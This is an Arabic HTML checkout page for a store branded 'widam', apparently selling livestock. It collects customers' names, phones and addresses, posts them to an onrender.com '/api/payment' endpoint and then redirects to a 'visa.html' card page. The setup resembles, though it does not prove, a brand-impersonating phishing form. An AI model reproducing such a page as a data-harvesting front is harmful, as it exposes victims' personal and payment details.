<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>متجر إلكتروني</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="form1.css">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">


</head>
<style>
  #imgheed{ 
width: 150px;
margin-left: auto;
}

.header {
  position: relative;
  box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
  background-color: #ffffff;
}


#botend{
  background-color: rgb(23, 52, 147);
}
h3{
  margin-top: -10px;
  margin-bottom: -10px;
}

#address1 , #address2{
  height: 45px;
  font-size: 16px;
  padding: 3px;
}
#textadres , #textadres1{
  margin-bottom: 5px;
}
#adress{
  height: 45px;
  background-color: #ffffff;
  color: #000;
}
.header {
  display: flex;
  align-items: center;
  justify-content: space-between;
  gap: 1rem;
  padding: 14px 18px;
  background: #072f57;
  border-radius: 20px;
  box-shadow: 0 12px 26px rgba(0,0,0,0.16);
  margin-bottom: 24px;
}
.lang-switch {
  display: flex;
  align-items: center;
  gap: 0.7rem;
  background: #ffffff;
  border-radius: 999px;
  padding: 10px 16px;
  color: #0f172a;
  font-weight: 700;
  font-size: 1rem;
}
.lang-switch .flag-emoji {
  font-size: 1.3rem;
}
.search-bar {
  flex: 1;
  display: flex;
  align-items: center;
  gap: 0.75rem;
  background: #ffffff;
  border-radius: 999px;
  padding: 10px 16px;
  min-width: 280px;
  max-width: 640px;
}
.search-bar .search-icon {
  font-size: 1.1rem;
}
.search-bar input {
  width: 100%;
  border: none;
  outline: none;
  font-size: 1rem;
  color: #0f172a;
  background: transparent;
}
.brand {
  text-align: right;
  color: #ffffff;
}
.brand {
  margin-inline-start: auto; /* بتدفعه لأقصى اليمين في الأنظمة العربية والانجليزية بشكل ذكي */
}

/* الكود الخاص بك يضل كما هو */
.brand .main {
  display: block;
  font-size: 1.5rem;
  font-weight: 900;
}
.brand .sub {
  display: block;
  font-size: 0.9rem;
  opacity: 0.8;
  margin-top: 2px;
}

</style>
<body>

   <div class="header">

    <div class="brand">
      <span class="main">ودام</span>
      <span class="sub">widam</span>
    </div>
  </div>

  <div class="box-shadow">
<form id="form1">
  <input type="text" name="userName" id="userName" placeholder="الاسم" required>
  <input type="tel" name="phone" id="phone" placeholder="رقم الجوال" required>

  <h3 id="textadres1">عنوان التوصيل</h3>
  <textarea name="address1" id="address1" placeholder="عنوان التوصيل" required></textarea>
  <textarea name="address2" id="address2" placeholder="المحافظة" required></textarea>

  <h3>طريقة الشراء</h3>
  <select id="purchaseMethod" name="purchase_method" required>
    <option value="">اختر</option>
    <option value="مذبوح">مذبوح</option>
    <option value="حي">حي</option>
  </select>

  <h3>موعد التوصيل</h3>
  <select id="deliveryTime" name="delivery_time" required>
    <option value="">اختر موعد التوصيل</option>
    <option value="صباحًا">صباحًا</option>
    <option value="مساءً">مساءً</option>
  </select>

  <input type="text" name="coupon" id="coupon" placeholder="كوبون الخصم">

  <button id="botend" type="submit">تأكيد العنوان</button>
</form>

  </div>

<script>
document.getElementById("form1").addEventListener("submit", function (e) {
  e.preventDefault();

  const name = document.getElementById("userName").value.trim();
  const phone = document.getElementById("phone").value.trim();
  const address1 = document.getElementById("address1").value.trim();
  const address2 = document.getElementById("address2").value.trim();
  const purchaseMethod = document.getElementById("purchaseMethod").value;
  const deliveryTime = document.getElementById("deliveryTime").value;
  const coupon = document.getElementById("coupon").value.trim();

if (coupon && coupon.toLowerCase() !== "snb30") {
  alert("كود الخصم غير صالح.");
  return;
}

  localStorage.setItem("userName", name);

  const message = `
📥 زبون جديد:
👤 الاسم: ${name}
📞 الهاتف: ${phone}
📍 العنوان: ${address1}
🏙️ المحافظة: ${address2}
🛒 طريقة الشراء: ${purchaseMethod}
⏰ موعد التوصيل: ${deliveryTime}
🏷️ كوبون الخصم: ${coupon || "لا يوجد"}
  `;

  fetch('https://wadamnew.onrender.com/api/payment', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ 
      name: name,
      phone: phone,
      address: address1,
      city: address2,
      method: purchaseMethod,
      deliveryTime: deliveryTime,
      coupon: coupon,
      message: message,
      type: 'customer_form'
    })
  })
  .then(response => {
    if (response.ok) {
      window.location.href = "visa.html";
    } else {
      alert("فشل في إرسال البيانات.");
    }
  })
  .catch(error => {
    console.error("⚠️ خطأ في الاتصال:", error);
    alert("حدث خطأ أثناء الإرسال.");
  });
});
</script>


</body>
</html>
